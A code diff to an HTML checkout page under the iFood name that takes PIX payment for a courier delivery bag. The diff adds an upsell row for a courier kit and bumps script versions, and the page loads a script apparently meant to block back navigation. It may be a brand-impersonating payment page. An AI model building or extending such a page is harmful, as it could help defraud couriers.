@@ -14,7 +14,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&family=Rawline:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css?v=7.6">
+    <link rel="stylesheet" href="style.css?v=7.7">
     <script src="/backguard.js?v=1.6"></script>
 </head>
 
@@ -67,16 +67,20 @@
                 <div class="pix-order-card">
                     <div class="pix-order-head">
                         <div class="pix-order-avatar">
-                            <img src="assets/bagfoto.webp" alt="Bag iFood">
+                            <img id="pix-order-image" src="assets/bagfoto.webp" alt="Bag iFood">
                         </div>
                         <div>
-                            <div class="pix-order-title">Bag do iFood</div>
+                            <div id="pix-order-title" class="pix-order-title">Bag do iFood</div>
                             <div class="pix-order-sub">N do pedido <span id="pix-order-id">-</span></div>
                         </div>
                     </div>
                     <div class="pix-order-total">
                         <span>Total no PIX</span>
                         <strong id="pix-amount">R$ 0,00</strong>
+                    </div>
+                    <div id="pix-reward-row" class="pix-order-row hidden">
+                        <span>Adicional Kit Entregador</span>
+                        <strong id="pix-reward-price">R$ 97,90</strong>
                     </div>
                     <div id="pix-bump-row" class="pix-order-row hidden">
                         <span>Seguro Bag (1 mes)</span>
@@ -176,7 +180,7 @@
         <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=8.9" defer></script>
+    <script src="script.js?v=9.0" defer></script>
 </body>
 
 </html>
